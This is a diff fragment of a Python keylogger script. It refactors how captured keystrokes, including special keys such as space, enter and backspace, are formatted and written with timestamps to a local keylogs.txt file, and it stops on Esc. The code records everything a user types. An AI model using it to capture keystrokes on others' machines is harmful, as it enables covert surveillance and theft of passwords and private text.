@@ -4,18 +4,29 @@ import logging
 log_file = "keylogs.txt"
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')
 
-def on_press(key):
+def format_key(key):
     try:
-        logging.info(f"key {key.char} pressed")
+        if hasattr(key, 'char') and key.char is not None:
+            return key.char
     except AttributeError:
-        if key == Key.space:
-            logging.info("Space key pressed")
-        elif key == Key.enter:
-            logging.info("Enter key pressed")
-        else:
-            # Log all other special keys (Shift, Ctrl, etc.)
-            logging.info(f"Special key {key} pressed")
-        
+        pass
+    return str(key).strip("'")
+
+
+def on_press(key):
+    formatted_key = format_key(key)
+    if key == Key.space:
+        logging.info("Space key pressed")
+    elif key == Key.enter:
+        logging.info("Enter key pressed")
+    elif key == Key.backspace:
+        logging.info("Backspace key pressed")
+    elif isinstance(key, Key):
+        logging.info(f"Special key {formatted_key} pressed")
+    else:
+        logging.info(f"key {formatted_key} pressed")
+
+
 def on_release(key):
     if key == Key.esc:
         return False
